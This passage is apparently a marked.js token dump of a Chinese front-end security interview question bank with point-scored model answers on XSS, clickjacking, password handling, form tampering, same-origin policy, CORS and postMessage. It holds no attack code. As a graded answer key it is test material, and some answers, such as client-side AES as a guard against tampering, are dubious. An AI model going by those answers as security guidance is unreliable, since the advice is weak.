也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","text":"**2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式","text":" 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式","escaped":false},{"type":"codespan","raw":"`（{{}}）`","text":"（{{}}）"},{"type":"text","raw":"时会对内容进行 HTML 转义，防止脚本注入。","text":"时会对内容进行 HTML 转义，防止脚本注入。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 前端如何防止点击劫持？\\n\\n","depth":2,"text":"前端如何防止点击劫持？","tokens":[{"type":"text","raw":"前端如何防止点击劫持？","text":"前端如何防止点击劫持？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","task":false,"loose":false,"text":"**2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","tokens":[{"type":"text","raw":"**2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","text":"**2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","text":" 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 在前端如何安全地处理用户密码？\\n\\n","depth":2,"text":"在前端如何安全地处理用户密码？","tokens":[{"type":"text","raw":"在前端如何安全地处理用户密码？","text":"在前端如何安全地处理用户密码？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。\\n- **1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。\\n- **1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。\\n","task":false,"loose":false,"text":"**1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","tokens":[{"type":"text","raw":"**1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","text":"**1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","text":" 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=\\"password\\"来隐藏用户输入。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。\\n","task":false,"loose":false,"text":"**1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","tokens":[{"type":"text","raw":"**1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","text":"**1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","text":" 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","task":false,"loose":false,"text":"**1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","tokens":[{"type":"text","raw":"**1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","text":"**1：** 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","text":" 避免本地缓存：设置表单元素的autocomplete=\\"off\\"，防止浏览器缓存密码。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？\\n\\n","depth":2,"text":"假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？","tokens":[{"type":"text","raw":"假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？","text":"假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。\\n- **1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。\\n- **1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。\\n","task":false,"loose":false,"text":"**1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","tokens":[{"type":"text","raw":"**1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","text":"**1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","text":" 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。\\n","task":false,"loose":false,"text":"**1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。","tokens":[{"type":"text","raw":"**1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n\\n在传输过程中没有被篡改。","text":"**1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。","text":" 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","task":false,"loose":false,"text":"**1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","tokens":[{"type":"text","raw":"**1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","text":"**1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","text":" 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是同源策略，它如何影响前端安全？\\n\\n","depth":2,"text":"什么是同源策略，它如何影响前端安全？","tokens":[{"type":"text","raw":"什么是同源策略，它如何影响前端安全？","text":"什么是同源策略，它如何影响前端安全？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。\\n- **1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。\\n","task":false,"loose":false,"text":"**1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","tokens":[{"type":"text","raw":"**1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","text":"**1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","text":" 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","task":false,"loose":false,"text":"**1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","tokens":[{"type":"text","raw":"**1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","text":"**1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","text":" 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 同源策略相关的安全机制有哪些\\n\\n","depth":2,"text":"同源策略相关的安全机制有哪些","tokens":[{"type":"text","raw":"同源策略相关的安全机制有哪些","text":"同源策略相关的安全机制有哪些","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n配置响应头如下","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n配置响应头如下","task":false,"loose":false,"text":"**1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n配置响应头如下","tokens":[{"type":"text","raw":"**1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n\\n配置响应头如下","text":"**1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以\\n配置响应头如下","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 跨域资源共享（CORS - Cross-Origin Resource Sharing）:","text":" 跨域资源共享（CORS - Cross-Origin Resource Sharing）:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。","text":"\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;示例：假设前端页面的源是 ","text":"\\n&emsp;示例：假设前端页面的源是 ","escaped":false},{"type":"codespan","raw":"`https://example.com`","text":"https://example.com"},{"type":"text","raw":"（协议为 https，域名是 example.com），要向 ","text":"（协议为 https，域名是 example.com），要向 ","escaped":false},{"type":"codespan","raw":"`https://api.example.com`","text":"https://api.example.com"},{"type":"text","raw":"（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端","text":"（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端","escaped":false},{"type":"codespan","raw":"`（https://api.example.com）`","text":"（https://api.example.com）"},{"type":"text","raw":"如果要允许来自 ","text":"如果要允许来自 ","escaped":false},{"type":"codespan","raw":"`https://example.com`","text":"https://example.com"},{"type":"text","raw":" 的跨域请求，可以\\n配置响应头如下","text":" 的跨域请求，可以\\n配置响应头如下","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nAccess-Control-Allow-Origin: https://example.com\\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\\nAccess-Control-Allow-Headers: Content-Type\\n//这意味着服务器允许 https://example.com 这个源使用 GET、POST 等指定的请求方法，并且允许带有 Content-Type 头的请求，浏览器看到这样的响应头后，就会\\n//知道这个跨域请求是被允许的，进而正常处理返回的数据。\\n```","lang":"js","text":"Access-Control-Allow-Origin: https://example.com\\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\\nAccess-Control-Allow-Headers: Content-Type\\n//这意味着服务器允许 https://example.com 这个源使用 GET、POST 等指定的请求方法，并且允许带有 Content-Type 头的请求，浏览器看到这样的响应头后，就会\\n//知道这个跨域请求是被允许的，进而正常处理返回的数据。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","task":false,"loose":false,"text":"**2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:","tokens":[{"type":"text","raw":"**2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n\\n&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样\\n\\n向 iframe 中的页面发送消息:","text":"**2：** 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 